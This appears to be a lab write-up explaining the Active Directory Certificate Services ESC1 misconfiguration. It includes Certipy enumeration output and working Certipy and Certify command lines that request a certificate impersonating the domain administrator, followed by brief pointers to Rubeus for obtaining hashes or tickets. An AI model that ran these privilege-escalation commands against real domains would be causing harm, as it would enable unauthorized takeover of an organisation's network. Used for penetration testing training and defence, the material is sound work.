The vulnerability happens when a certificate template has:

1. The certificate template allows the **enrollee to supply subject information** (The CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag is enabled.) 
2. **Client Authentication** EKU
3. **Any user** (like `Domain Users`) has **Enroll** rights.
4. No **manager approval** required

This means that Any user can **request a certificate that says they're the domain administrator** (or anyone) — and the CA will **sign it** without asking questions.

```bash
 5
    Template Name                       : ESC1
    Display Name                        : ESC1
    Certificate Authorities             : LOL-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-07-17T00:15:41+00:00
    Template Last Modified              : 2025-07-17T00:15:41+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOL.LOCAL\Domain Users
      Object Control Permissions
        Owner                           : LOL.LOCAL\Enterprise Admins
        Full Control Principals         : LOL.LOCAL\Domain Admins
                                          LOL.LOCAL\Local System
                                          LOL.LOCAL\Enterprise Admins
        Write Owner Principals          : LOL.LOCAL\Domain Admins
                                          LOL.LOCAL\Local System
                                          LOL.LOCAL\Enterprise Admins
        Write Dacl Principals           : LOL.LOCAL\Domain Admins
                                          LOL.LOCAL\Local System
                                          LOL.LOCAL\Enterprise Admins
    [+] User Enrollable Principals      : LOL.LOCAL\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.

```

---

Exploiting an ESC1 vulnerability typically involves two main steps:
1. Requesting a certificate using the vulnerable template, injecting the identity of a privileged target(administrator).
2. Using the obtained certificate to authenticate as that target.



```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'VulnTemplate' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
```

- `-u 'attacker@corp.local' -p 'Passw0rd!'`: Credentials of the user that can perform the request.
- `-dc-ip '10.0.0.100'`: IP address of a Domain Controller for DNS lookups if needed.
- `-target 'CA.CORP.LOCAL' -ca 'CORP-CA'`: Specifies the target CA name and its DNS/hostname.
- `-template 'VulnTemplate'`: The ESC1 vulnerable template name.
- `-upn 'administrator@corp.local'`: The UPN of the target user to be embedded in the certificate's SAN (the impersonated user).
- `-sid 'S-1-5-21-...-500'`: The SID of the target user (Administrator) to be embedded in the certificate's SID extension.

> [!NOTE]
  💡 : To find the SID and other attributes of a target user like 'administrator', you can use the command: `certipy account -u 'USERNAME' -p 'PASSWORD' -dc-ip 'DC_IP' -user 'administrator' read`
  




We can request a certificate for the domain administrator.
```bash
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC1 /altname:essos\administrator /sid:S-1-5-21-1394808576-3393508183-1134699666-500
```

then convert to PFX

then Use Rubeus to either request NTLM hash directly or get a Kerberos TGT